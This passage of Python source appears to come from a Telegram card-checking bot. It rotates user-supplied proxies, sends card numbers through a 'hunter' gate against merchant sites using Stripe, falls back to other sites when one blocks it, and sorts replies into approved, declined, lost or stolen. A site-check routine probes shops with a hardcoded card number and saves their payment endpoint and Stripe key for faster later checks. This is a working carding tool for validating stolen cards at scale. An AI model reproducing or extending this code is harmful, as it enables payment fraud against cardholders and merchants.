            temp_file = USER_PROXIES_FILE + ".tmp"
            with open(temp_file, "w") as f:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX)
                json.dump(data, f, indent=2)
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
            os.replace(temp_file, USER_PROXIES_FILE)
            return True
        except Exception as e:
            pass  # PERF: stdout removed
            return False

def parse_proxy_enhanced(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None, None, None

    protocol = "http"
    if "://" in proxy_str:
        protocol_part, proxy_str = proxy_str.split("://", 1)
        protocol = protocol_part.lower()

    if "@" in proxy_str:
        auth, address = proxy_str.split("@", 1)
        proxy_url = f"{protocol}://{auth}@{address}"
        return proxy_url, proxy_str, "Premium"

    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        proxy_url = f"{protocol}://{user}:{pw}@{ip}:{port}"
        return proxy_url, proxy_str, "Premium"

    if len(parts) == 2:
        ip, port = parts
        proxy_url = f"{protocol}://{ip}:{port}"
        return proxy_url, proxy_str, "Free"

    if ":" in proxy_str:
        return f"{protocol}://{proxy_str}", proxy_str, "Premium"

    return None, None, None

def get_user_proxy(chat_id):
    data = load_user_proxies()
    user_data = data.get(str(chat_id), {})
    if not user_data:
        return None

    proxies = user_data.get("proxies", [])
    if proxies and isinstance(proxies, list) and len(proxies) > 0:
        live_proxies = [p for p in proxies if p.get("status") == "live"]
        if live_proxies:
            chosen = random.choice(live_proxies)
            proxy_raw = chosen.get("proxy")
            proxy_url, _, _ = parse_proxy_enhanced(proxy_raw)
            return proxy_url if proxy_url else proxy_raw

    status = user_data.get("status", "live")
    if status == "dead":
        return None

    proxy = user_data.get("proxy")
    if proxy:
        proxy_url, _, _ = parse_proxy_enhanced(proxy)
        return proxy_url if proxy_url else proxy
    return None

def remove_dead_proxy_for_user(chat_id, proxy_raw):
    data = load_user_proxies()
    chat_id_str = str(chat_id)
    if chat_id_str not in data:
        return False
    user_data = data[chat_id_str]
    proxies = user_data.get("proxies", [])
    updated_proxies = [p for p in proxies if p.get("proxy") != proxy_raw]
    user_data["proxies"] = updated_proxies
    live_count = len([p for p in updated_proxies if p.get("status") == "live"])
    dead_count = len([p for p in updated_proxies if p.get("status") == "dead"])
    user_data["live"] = live_count
    user_data["dead"] = dead_count
    if updated_proxies:
        live_proxies = [p for p in updated_proxies if p.get("status") == "live"]
        if live_proxies:
            user_data["proxy"] = live_proxies[0].get("proxy")
            user_data["status"] = "live"
        else:
            user_data["proxy"] = ""
            user_data["status"] = "dead"
    else:
        del data[chat_id_str]
        return save_user_proxies(data)
    data[chat_id_str] = user_data
    return save_user_proxies(data)

def is_valid_ip_or_host(text):
    if not text:
        return False
    if all(c.isdigit() or c == '.' for c in text):
        parts = text.split('.')
        if len(parts) == 4:
            return all(p.isdigit() and 0 <= int(p) <= 255 for p in parts if p)
    if '.' in text and not text.startswith('.') and not text.endswith('.'):
        return True
    if text.replace('-', '').replace('_', '').isalnum():
        return True
    return False

def is_valid_port(text):
    try:
        port = int(text)
        return 1 <= port <= 65535
    except:
        return False

def parse_proxy_line(line):
    if not line:
        return None
    line = str(line).strip()
    if not line:
        return None

    protocol = "http"
    protocols = ["http://", "https://", "socks4://", "socks5://", "socks://"]
    for proto in protocols:
        if line.lower().startswith(proto):
            protocol = proto.replace("://", "")
            line = line[len(proto):]
            break

    user_pass = None
    ip_port = None

    try:
        if '|' in line and ':' not in line:
            line = line.replace('|', ':')
        elif ';' in line and ':' not in line:
            line = line.replace(';', ':')
        elif ',' in line and ':' not in line:
            line = line.replace(',', ':')
        elif ' ' in line and ':' not in line:
            line = ':'.join(line.split())

        if "@" in line:
            parts = line.split("@")
            if len(parts) == 2:
                left = parts[0].split(":")
                right = parts[1].split(":")
                left_has_host = len(left) >= 1 and is_valid_ip_or_host(left[0])
                right_has_host = len(right) >= 1 and is_valid_ip_or_host(right[0])
                left_has_port = len(left) >= 2 and is_valid_port(left[1])
                right_has_port = len(right) >= 2 and is_valid_port(right[1])
                if left_has_host and left_has_port:
                    ip_port = [left[0], left[1]]
                    if len(right) >= 2:
                        user_pass = [right[0], ':'.join(right[1:])]
                elif right_has_host and right_has_port:
                    ip_port = [right[0], right[1]]
                    if len(left) >= 2:
                        user_pass = [left[0], ':'.join(left[1:])]
        else:
            parts = line.split(":")
            if len(parts) == 2:
                if is_valid_ip_or_host(parts[0]) and is_valid_port(parts[1]):
                    ip_port = [parts[0], parts[1]]
                else:
                    return None
            elif len(parts) == 4:
                first_is_host = is_valid_ip_or_host(parts[0])
                second_is_port = is_valid_port(parts[1])
                third_is_host = is_valid_ip_or_host(parts[2])
                fourth_is_port = is_valid_port(parts[3])
                if first_is_host and second_is_port:
                    ip_port = [parts[0], parts[1]]
                    user_pass = [parts[2], parts[3]]
                elif third_is_host and fourth_is_port:
                    ip_port = [parts[2], parts[3]]
                    user_pass = [parts[0], parts[1]]
                else:
                    ip_port = [parts[0], parts[1]]
                    user_pass = [parts[2], parts[3]]

        if not ip_port or len(ip_port) < 2:
            return None
        if not is_valid_ip_or_host(ip_port[0]) or not is_valid_port(ip_port[1]):
            return None

        if user_pass and len(user_pass) >= 2 and user_pass[0] and user_pass[1]:
            u_enc = quote(str(user_pass[0]), safe='')
            p_enc = quote(str(user_pass[1]), safe='')
            proxy_url = f"{protocol}://{u_enc}:{p_enc}@{ip_port[0]}:{ip_port[1]}"
        else:
            proxy_url = f"{protocol}://{ip_port[0]}:{ip_port[1]}"

        return {
            'http': proxy_url,
            'https': proxy_url,
            'raw': line.strip(),
            'ip': ip_port[0],
            'port': ip_port[1],
            'has_auth': user_pass is not None and len(user_pass) >= 2
        }
    except:
        return None

def parse_proxy_from_bot(proxy_raw):
    if not proxy_raw:
        return None
    proxy_raw = str(proxy_raw).strip()
    if not proxy_raw:
        return None

    protocol = "http"
    clean_raw = proxy_raw
    for proto in ["socks5h://", "socks5://", "socks4://", "https://", "http://"]:
        if proxy_raw.lower().startswith(proto):
            protocol = proto.replace("://", "")
            clean_raw = proxy_raw[len(proto):]
            break

    ip, port, user, pw = None, None, None, None

    try:
        if "@" in clean_raw:
            at_idx = clean_raw.rfind("@")
            auth_part = clean_raw[:at_idx]
            host_part = clean_raw[at_idx+1:]
            host_parts = host_part.split(":")
            if len(host_parts) >= 2:
                ip = host_parts[0]
                port = host_parts[1]
            colon_idx = auth_part.find(":")
            if colon_idx > 0:
                user = auth_part[:colon_idx]
                pw = auth_part[colon_idx+1:]
            if not ip or not port:
                auth_parts = auth_part.split(":")
                if len(auth_parts) >= 2 and auth_parts[1].isdigit():
                    ip = auth_parts[0]
                    port = auth_parts[1]
                    if len(host_parts) >= 2:
                        user = host_parts[0]
                        pw = ":".join(host_parts[1:])
        else:
            parts = clean_raw.split(":")
            if len(parts) == 2:
                ip, port = parts[0], parts[1]
            elif len(parts) >= 4:
                if parts[1].isdigit() and not parts[3].isdigit():
                    ip, port = parts[0], parts[1]
                    user = parts[2]
                    pw = ":".join(parts[3:])
                elif parts[3].isdigit() and not parts[1].isdigit():
                    ip, port = parts[2], parts[3]
                    user = parts[0]
                    pw = parts[1]
                else:
                    ip, port = parts[0], parts[1]
                    user = parts[2]
                    pw = ":".join(parts[3:])
            elif len(parts) == 3:
                ip, port = parts[0], parts[1]

        if not ip or not port:
            return None

        if user and pw:
            user_enc = quote(user, safe='')
            pw_enc = quote(pw, safe='')
            proxy_url = f"{protocol}://{user_enc}:{pw_enc}@{ip}:{port}"
        else:
            proxy_url = f"{protocol}://{ip}:{port}"

        return {
            'http': proxy_url,
            'https': proxy_url,
            'raw': clean_raw
        }
    except Exception as e:
        return None

def get_proxy_for_request(chat_id=None):
    proxy_raw = get_proxy_for_request_global(chat_id)
    if proxy_raw:
        proxy_url, _, _ = parse_proxy_enhanced(proxy_raw)
        if proxy_url:
            return {
                'http': proxy_url,
                'https': proxy_url,
                'raw': proxy_raw
            }
        parsed = parse_proxy_line(proxy_raw)
        if parsed:
            return {
                'http': parsed['http'],
                'https': parsed['https'],
                'raw': proxy_raw
            }
    return None

def _is_premium_proxy(proxy_str):
    if not proxy_str:
        return False
    clean = proxy_str.strip()
    if "://" in clean:
        clean = clean.split("://", 1)[1]
    if "@" in clean:
        return True
    if len(clean.split(":")) >= 4:
        return True
    return False

def _get_all_premium_proxies(exclude_user=None):
    data = load_user_proxies()
    premium_list = []
    for uid, udata in data.items():
        if exclude_user and str(uid) == str(exclude_user):
            continue
        proxies = udata.get("proxies", [])
        for p in proxies:
            raw = p.get("proxy", "")
            if p.get("status") == "live" and _is_premium_proxy(raw):
                premium_list.append(raw)
        top = udata.get("proxy", "")
        if top and _is_premium_proxy(top) and top not in premium_list:
            premium_list.append(top)
    return premium_list

def get_proxy_for_request_global(chat_id=None):
    if str(chat_id) == OWNER_ID:
        owner_proxy = get_user_proxy(chat_id)
        if owner_proxy:
            return owner_proxy
        premium_proxies = _get_all_premium_proxies()
        if premium_proxies:
            return random.choice(premium_proxies)
        return None
    if chat_id:
        user_proxy = get_user_proxy(chat_id)
        if user_proxy:
            return user_proxy
    return None


# ============================================
# BOT INTERFACE: process_card_enhanced
# Single hunter instance, per-user proxy
# ============================================

def process_card_enhanced(domain, ccx, chat_id=None, use_registration=True, received_proxy=None):
    proxy = None
    if received_proxy:
        proxy = parse_proxy_from_bot(received_proxy)
        pass  # PERF: stdout removed
    else:
        proxy = get_proxy_for_request(chat_id)

    if not proxy:
        return {"response": "No proxy available. Add proxy first using /addproxy", "status": "Error"}

    pass  # PERF: stdout removed
    proxy_dict = {'http': proxy['http'], 'https': proxy['https']}

    result = hunter.process_single_gate(domain, ccx, proxy_dict, use_cache=True)

    raw_response = result.get('response', 'Unknown')

    if 'Registration failed' in str(raw_response) or 'Site blocked' in str(raw_response):
        all_sites = get_all_sites()
        for fallback_site in all_sites:
            if fallback_site != domain:
                pass  # PERF: stdout removed
                result = hunter.process_single_gate(fallback_site, ccx, proxy_dict, use_cache=True)
                raw_response = result.get('response', 'Unknown')
                if 'Registration failed' not in str(raw_response) and 'Site blocked' not in str(raw_response):
                    break

    status_map = {
        'APPROVED': 'Approved',
        'FAILED': 'Declined',
        'ERROR': 'Error',
    }

    clean_response = _clean_response(raw_response, result.get('status', 'ERROR'))

    return {
        "status": status_map.get(result.get('status', 'ERROR'), 'Declined'),
        "response": clean_response,
    }


def _clean_response(raw, status):
    try:
        if isinstance(raw, str):
            try:
                data = json.loads(raw)
            except:
                data = None

            if data and isinstance(data, dict):
                if status == 'APPROVED' or data.get('success') is True:
                    return "Card added successfully 💯"

                err = data.get('data', {}).get('error', {})
                if isinstance(err, dict) and 'message' in err:
                    return err['message']

                if 'error' in data:
                    e = data['error']
                    if isinstance(e, dict) and 'message' in e:
                        return e['message']
                    return str(e)

            lower = raw.lower()
            if status == 'APPROVED' or 'succeeded' in lower or 'success' in lower:
                return "Card added successfully 💯"
            if 'decline' in lower:
                return "Your card was declined."
            if 'insufficient' in lower:
                return "Insufficient funds."
            if 'expired' in lower:
                return "Your card has expired."
            if 'incorrect' in lower and 'cvc' in lower:
                return "Incorrect CVC."
            if 'security code' in lower:
                return "Incorrect security code."
            if 'lost' in lower:
                return "Card reported lost."
            if 'stolen' in lower:
                return "Card reported stolen."
            if 'processing' in lower:
                return "Processing error, try again."
            if '3d' in lower or 'authentication' in lower:
                return "3D Secure authentication required."

        return raw if raw else "Unknown error"
    except:
        return raw if raw else "Unknown error"


# ============================================
# SITE CHECK (bot calls this)
# ============================================

def check_site_status(domain, chat_id=None, received_proxy=None):
    """Site check = full gate test + save ALL patterns permanently
    Next time card check will be FAST using saved pattern"""
    domain = domain.replace('https://', '').replace('http://', '').split('/')[0].strip()
    pass  # PERF: stdout removed
    proxy = None
    if received_proxy:
        proxy = parse_proxy_from_bot(received_proxy)
    else:
        proxy = get_proxy_for_request(chat_id)

    if not proxy:
        return {"status": "error", "message": "No proxy available. Add proxy first using /addproxy"}

    proxy_dict = {'http': proxy['http'], 'https': proxy['https']}

    try:
        test_card = "4154644405488124|09|2026|968"

        result = hunter.process_single_gate(domain, test_card, proxy_dict, use_cache=False)

        test_status_raw = result.get('status', 'ERROR')
        test_response = result.get('response', 'No response')
        elapsed = result.get('time', 0)

        pass  # PERF: stdout removed
        pass  # PERF: stdout removed
        cached = hunter.load_gate_details(domain)
        has_pattern = cached and cached.get('payment_pattern') and cached['payment_pattern'].get('endpoint_url')
        stripe_key = cached.get('stripe_key', 'Not Found') if cached else 'Not Found'

        if has_pattern:
            pass  # PERF: stdout removed
            pass  # PERF: stdout removed
        if test_status_raw in ('APPROVED', 'FAILED') and 'No Stripe key' not in test_response and 'Cannot access' not in test_response:
            return {
                "status": "success",
                "stripe_key": stripe_key,
                "message": f"Site working! Pattern saved permanently. Next checks will be fast.",
                "test_card_status": "Approved" if test_status_raw == 'APPROVED' else "Declined",
                "test_card_response": test_response,
                "nonce_found": True,
                "nonce_url": None,
                "pattern_saved": has_pattern,
            }
        elif stripe_key and stripe_key != 'Not Found':
            return {
                "status": "partial",
                "stripe_key": stripe_key,
                "message": "Site has Stripe key but card test had issues",
                "test_card_status": "Error",
                "test_card_response": test_response,
                "nonce_found": False,
                "nonce_url": None,
                "pattern_saved": has_pattern,
            }
        else:
            return {
                "status": "failed",
                "stripe_key": "Not Found",
                "message": "Site has no valid Stripe key or unreachable",
                "test_card_status": "Not Tested",
                "test_card_response": test_response,
            }
    except Exception as e:
        pass  # PERF: stdout removed
        return {
            "status": "failed",
            "stripe_key": "Not Found",
            "message": f"Error: {str(e)}",
            "test_card_status": "Not Tested",
            "test_card_response": f"Site check error: {str(e)}"
        }
